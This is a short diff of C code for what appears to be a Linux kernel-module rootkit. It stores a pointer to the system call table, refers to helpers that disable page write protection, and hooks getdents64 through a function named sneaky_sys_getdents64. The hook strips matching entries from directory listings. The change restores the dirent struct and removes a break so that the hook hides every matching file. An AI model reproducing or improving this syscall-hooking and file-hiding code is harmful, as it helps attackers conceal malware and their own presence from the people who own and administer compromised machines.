@@ -14,14 +14,13 @@
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
-// struct linux_dirent64 {
-//   uint64_t d_ino;    /* 64-bit inode number */
-//   uint64_t d_off;    /* 64-bit offset to next structure */
-//   unsigned short d_reclen; /* Size of this dirent */
-//   unsigned char d_type;   /* File type */
-//   char d_name[]; /* Filename (null-terminated) */
-// };
-
+struct linux_dirent64 {
+  uint64_t d_ino;    /* 64-bit inode number */
+  uint64_t d_off;    /* 64-bit offset to next structure */
+  unsigned short d_reclen; /* Size of this dirent */
+  unsigned char d_type;   /* File type */
+  char d_name[]; /* Filename (null-terminated) */
+};
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -61,7 +60,6 @@ asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dir
       void* source = (char*)d + current_size;
       memmove(d,source,rest);
       nread -= current_size;
-      break;
     }
     else{
       bpos += d->d_reclen;
